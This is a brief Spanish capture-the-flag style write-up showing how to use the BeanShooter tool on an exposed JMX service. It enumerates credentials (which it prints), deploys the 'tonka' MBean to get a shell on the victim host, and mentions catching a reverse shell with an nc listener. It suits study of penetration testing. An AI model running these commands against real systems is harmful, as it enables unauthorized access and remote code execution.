#beanshooter #java

-------

**BeanShooter** es una herramienta orientada a _enumeración y pruebas_ sobre endpoints JMX (Java Management Extensions). En pocas palabras, ayuda a descubrir y analizar **posibles vulnerabilidades en interfaces JMX** expuestas por aplicaciones Java.
Usamos el repositorio https://github.com/qtc-de/beanshooter

---

Vamos a usar [[git clone]] para descargar el repositorio con el comando `git clone https://github.com/qtc-de/beanshooter` despues nos metemos con [[cd]] a la carpeta usando `cd beenshooter` y vamos a compilar con `mvn package`

![[Manage10.png]]

Dentro de la carpeta *beanshooter-4.1.0/target* se va a crear el ejecutable asi que vamos a abrirlo y que nos enumere poniendo la ip de la maquina victima y el puerto `java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.129.234.57 2222`

![[Manage11.png]]

![[Manage12.png]]
Nos da estas dos credenciales

```
manager:fhErvo2r9wuTEYiYgt
admin:onyRPCkaG4iX72BrRtKgbszd
```


### Antes de ejecutar la parte de tonka 

Esto lo hice por que me aparecia un error que no tenia el  archivo tonka-bean-4.1.0-jar-with-dependencies.jar
Asi que fui a */beanshooter-4.1.0/tonka-bean/target* y ahi ejecute el comando `mvn package`

![[Manage13.png]]

Ahora esto para ejecutar el tonka y que a posteriori podamos obtener la shell `java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.129.234.57 2222 tonka`
![[Manage14.png]]

Ejecutamos el comando que nos va a dar una shell `java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.129.234.57 2222`
![[Manage15.png]]
y ahora vamos a enviarnos una [[Reverse shell]] con una bash para trabajar mas comodos mientras estamos en escucha con [[nc -nlvp 443]]

![[Manage16.png]]
![[Manage17.png]]
